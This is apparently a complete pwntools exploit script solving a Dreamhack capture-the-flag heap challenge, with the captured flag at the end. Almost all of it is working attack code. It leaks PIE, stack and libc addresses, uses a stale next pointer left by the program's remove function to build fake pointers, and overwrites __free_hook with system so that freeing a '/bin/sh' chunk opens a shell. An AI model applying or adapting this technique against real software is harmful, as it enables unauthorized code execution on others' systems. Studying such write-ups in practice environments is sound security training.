#!/usr/bin/env python3

from pwn import *

# bug in remove function, doesnt clear out the next ptr

exe = ELF('./prob_patched')
libc = ELF('./libc-2.31.so')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def make(number, leng, info):
	sla(b">> ", b"1")
	sla(b">> ", f"{number}".encode())
	sla(b">> ", f"{leng}".encode())
	sa(b">> ", info)

def copy(src_number, dis_number):
	sla(b">> ", b"2")
	sla(b">> ", f"{src_number}".encode())
	sla(b">> ", f"{dis_number}".encode())

def remove(number):
	sla(b">> ", b"3")
	sla(b">> ", f"{number}".encode())

script = '''
brva 0x1702
'''

p = remote("host8.dreamhack.games", 15688)
#p = process('./prob_patched')
#p = gdb.debug('./prob_patched', gdbscript = script)

# leak pie and stack via uninitalize var in stack
sa(b"name?\n", b"A" * 8)
rcu(b"A" * 8)
code_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x17d0
lleak("code_base", code_base)

sla(b">> ", b"4")
sa(b"name\n", b"A" * 0x20)
rcu(b"A" * 0x20)
rbp_main = u64(p.recv(6).ljust(8, b"\x00")) - 0xf0
lleak("rbp_main", rbp_main)

# heap fengshui
make(1, 0x28, b"1" * 0x18)
make(2, 0x28, b"2" * 0x18)
make(3, 0x28, b"3" * 0x18)
remove(2)
remove(1)

# make fake info ptr point to name on stack
## also becareful set up the size to use strncopy later
make(4, 0x18, b"4" * 4 + p32(0x18) + p64(rbp_main - 0x10) + p64(0))
copy(3, 0x34343434)

# only can leak via name
## leak libc (ignore the canary of main function will be overwrite, as long as we dont return from main)
## abuse strncopy to padding the name string
make(5, 0x28, b"5" * 0x28)
copy(5, 0x34343434)
##
sla(b">> ", b"4")
sa(b"name\n", b"A" * 0x20)
rcu(b"A" * 0x20 + b"5" * 0x18)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x270b3
lleak("libc_base", libc_base)

# use same method, make arbitrary pointer to free hook and overwrite it
## strncopy terminate when meet nullbyte, so short overwrite payload is better
system = libc_base + libc.symbols['system']
__free_hook = libc_base + libc.symbols['__free_hook']
make(5, 0x18, b"4" * 8 + p64(__free_hook) + p64(0))
copy(5, 4)
make(5, 0x18, p64(system))
copy(5, 0x34343434)

# trigger
make(6, 0x18, b"/bin/sh\x00")
remove(6)

#debug()

p.interactive()
#DH{I_Can't_Understand_Why_Tcache_Exist}
